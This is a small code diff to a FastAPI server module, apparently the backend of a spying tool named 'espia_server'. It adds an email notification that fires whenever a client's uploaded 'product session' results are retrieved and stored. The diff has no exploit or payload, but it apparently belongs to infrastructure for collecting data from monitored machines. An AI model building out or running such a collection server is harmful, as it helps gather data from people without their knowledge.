@@ -2,7 +2,7 @@ import os
 import pathlib
 from fastapi import FastAPI, File, UploadFile, Request
 from starlette.responses import FileResponse
-
+from espia_server.app.plugins.mails.mail_handler import send_mail
 from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, block, \
     title
 
@@ -31,6 +31,7 @@ def upload_results(results: dict) -> dict:
     create_new_client_dir(session_id)
     handle_products_results(session_id, results)
     print(block + f"[+] Successfully retrieved product session {session_id}")
+    send_mail(session_id)
     return {}
 
 
